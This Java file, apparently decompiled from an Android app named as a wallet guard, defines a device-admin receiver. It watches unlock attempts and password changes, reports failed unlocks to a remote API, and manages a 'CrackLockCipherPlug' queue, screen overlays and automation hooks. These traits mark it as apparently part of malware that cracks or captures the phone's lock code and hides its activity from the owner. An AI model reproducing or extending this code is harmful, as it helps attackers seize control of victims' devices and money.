package com.guard.wallet.receiver;

import com.guard.wallet.core.AppUtils;
import android.app.admin.DeviceAdminReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.UserHandle;
import android.util.Log;
import com.guard.wallet.MainApplication;
import com.guard.wallet.helper.OverlayViewHelper;
import com.guard.wallet.helper.AutomationHelper;
import com.guard.wallet.http.HttpApiManager;
import com.guard.wallet.plug.CrackLockCipherPlug;
import com.guard.wallet.req.MessageRecordVO;
import com.guard.wallet.req.ReqListenHelper;
import com.guard.wallet.resp.DeviceAdminVO;
import com.guard.wallet.utils.SystemHelper;
import com.guard.wallet.utils.SharedPrefsManager;

import java.util.Objects;

public class CustomAdminReceiver extends DeviceAdminReceiver {
    private static final String TAG = "CustomAdminReceiver";

    public static void notifyAdminStateChanged() {
        DeviceAdminVO deviceAdmin = SystemHelper.C0();
        MessageRecordVO<DeviceAdminVO> record = new MessageRecordVO<>();
        record.setExtraBody(deviceAdmin);
        record.setIntentCode(Objects.equals(deviceAdmin.getIsAdminActive(), 1)
                ? "android.app.action.DEVICE_ADMIN_ENABLED"
                : "android.app.action.DEVICE_ADMIN_DISABLED");
        Log.d(TAG, deviceAdmin.toString());
        if (MainApplication.getInstance() != null
                && MainApplication.getInstance().getHandlerMsgAndTimer() != null) {
            MainApplication.getInstance().getHandlerMsgAndTimer().b(record);
        }
    }

    @Override
    public void onEnabled(Context context, Intent intent) {
        super.onEnabled(context, intent);
        SharedPrefsManager.B(false, false);
        notifyAdminStateChanged();
    }

    @Override
    public void onDisabled(Context context, Intent intent) {
        super.onDisabled(context, intent);
        SharedPrefsManager.B(false, false);
        notifyAdminStateChanged();
    }

    @Override
    public void onLockTaskModeEntering(Context context, Intent intent, String pkg) {
        super.onLockTaskModeEntering(context, intent, pkg);
        Log.d(TAG, "CustomAdminReceiver.onLockTaskModeEntering");
    }

    @Override
    public void onLockTaskModeExiting(Context context, Intent intent) {
        super.onLockTaskModeExiting(context, intent);
        Log.d(TAG, "CustomAdminReceiver.onLockTaskModeExiting");
    }

    @Override
    public void onPasswordChanged(Context context, Intent intent, UserHandle user) {
        super.onPasswordChanged(context, intent, user);
        Log.d(TAG, "CustomAdminReceiver.onPasswordChanged");
        SharedPrefsManager.G("android.intent.action.DEVICE_PASSWORD_CHANGED");
        synchronized (com.guard.wallet.req.ReqUnlockDeviceVO.class) {
            SharedPrefsManager.w("deviceCipher");
        }
        synchronized (com.guard.wallet.req.ReqUnlockDeviceVO.class) {
            SharedPrefsManager.w("deviceCipherLocked");
        }
    }

    @Override
    public void onPasswordExpiring(Context context, Intent intent, UserHandle user) {
        super.onPasswordExpiring(context, intent, user);
        Log.d(TAG, "CustomAdminReceiver.onPasswordExpiring");
        SharedPrefsManager.G("android.intent.action.DEVICE_PASSWORD_EXPIRED");
    }

    @Override
    public void onPasswordFailed(Context context, Intent intent, UserHandle user) {
        super.onPasswordFailed(context, intent, user);
        Log.d(TAG, "CustomAdminReceiver.onPasswordFailed");
        SharedPrefsManager.G("android.intent.action.DEVICE_PASSWORD_FAILED");
        if (SystemHelper.p0()) {
            SharedPrefsManager.D(ScreenBroadcastReceiver.b.nextId(), "lockBatchId");
        }
        String subscribeId = SharedPrefsManager.l("lockSubscribeId");
        if (!AppUtils.B(subscribeId) && SystemHelper.p0()) {
            HttpApiManager.localListenHelper(new ReqListenHelper(subscribeId, 5));
        }
        if (MainApplication.getInstance() != null
                && MainApplication.getInstance().getCrackLockCipherPlug() != null) {
            Log.d("com.guard.wallet.plug.c", "cacheResponseQueue clearError");
            CrackLockCipherPlug.responseQueue.clear();
        }
    }

    @Override
    public void onPasswordSucceeded(Context context, Intent intent, UserHandle user) {
        super.onPasswordSucceeded(context, intent, user);
        Log.d(TAG, "CustomAdminReceiver.onPasswordSucceeded");
        if (MainApplication.getInstance() != null
                && MainApplication.getInstance().getCrackLockCipherPlug() != null) {
            CrackLockCipherPlug.responseQueue.clear();
        }
        if (AutomationHelper.k()) {
            AutomationHelper.g(true);
        }
        if (OverlayViewHelper.i() || OverlayViewHelper.h()) {
            OverlayViewHelper.f(null, true);
        }
    }
}
